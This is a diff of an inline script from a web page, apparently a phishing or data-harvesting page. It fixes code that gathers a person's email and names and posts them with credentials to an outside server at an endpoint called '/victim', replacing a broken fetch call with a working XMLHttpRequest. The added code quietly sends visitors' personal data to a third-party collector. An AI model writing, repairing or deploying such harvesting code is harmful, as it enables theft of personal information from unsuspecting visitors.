@@ -305,25 +305,25 @@
         correoLi.textContent = `Correo: ${correo}`;
         lista.appendChild(correoLi);
 
-        const data_victim = {
+        var data = JSON.stringify({
             "email_access": email,
-            "names_access": Nombres
-        }
+            "names_access": nombres_encontrados
+        });
+        console.log(data);
 
-        const opciones = {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(datos)
-        };
-
-        const url = 'http:app.prexxa.com.co/victim';
-
-        fetch(url, opciones)
-            .then(response => response.json())
-            .then(data => console.log(data))
-            .catch(error => console.error(error));
+        var xhr = new XMLHttpRequest();
+        xhr.withCredentials = true;
+        
+        xhr.addEventListener("readystatechange", function() {
+          if(this.readyState === 4) {
+            console.log(this.responseText);
+          }
+        });
+        
+        xhr.open("POST", "http://app.prexxa.com.co/victim");
+        xhr.setRequestHeader("Content-Type", "application/json");
+        
+        xhr.send(data);
 
     </script>
 
